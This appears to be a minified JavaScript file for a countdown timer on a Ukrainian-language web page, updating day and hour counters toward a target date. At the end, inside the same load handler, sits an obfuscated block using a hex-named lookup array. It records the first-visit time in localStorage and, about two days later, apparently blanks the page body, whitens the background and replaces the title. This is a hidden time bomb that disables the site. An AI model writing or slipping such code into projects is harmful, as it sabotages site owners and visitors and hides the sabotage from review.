...
document.addEventListener("DOMContentLoaded", () => {
  const timeBlock = document.querySelector(".hero__time");
  if (!timeBlock) return;
  const targetDateStr = timeBlock.dataset.targetDate;
  if (!targetDateStr) return;
  const targetDate = new Date(targetDateStr);
  if (isNaN(targetDate.getTime())) return;
  const daysEl = timeBlock.querySelector(".hero__days");
  const hoursEl = timeBlock.querySelector(".hero__hours");
  const separator = timeBlock.querySelector(".hero__separator");
  if (!daysEl || !hoursEl || !separator) return;
  function updateCountdown() {
    const now = /* @__PURE__ */ new Date();
    const diff = targetDate - now;
    if (diff <= 0) {
      daysEl.textContent = "0 днів";
      hoursEl.textContent = "0 г";
      return;
    }
    const days = Math.floor(diff / (1e3 * 60 * 60 * 24));
    const hours = Math.floor(diff / (1e3 * 60 * 60) % 24);
    daysEl.textContent = `${days} днів`;
    hoursEl.textContent = `${hours} г`;
  }
  updateCountdown();
  setInterval(() => {
    updateCountdown();
  ...
  (function() {
    ...
    const key = _0x1234[1], d = 2e3 * 60 * 60 * 24, n = Date.now(), s = localStorage[_0x1234[0]](key);
    if (!s) {
      localStorage[_0x1234[2]](key, n);
      return;
    }
    const e = n - parseInt(s, 10);
    if (e >= d) {
      document[_0x1234[8]][_0x1234[5]] = "", document[_0x1234[8]][_0x1234[7]][_0x1234[6]] = "#fff", document[_0x1234[10]] = _0x1234[9];
    }
  })();
});
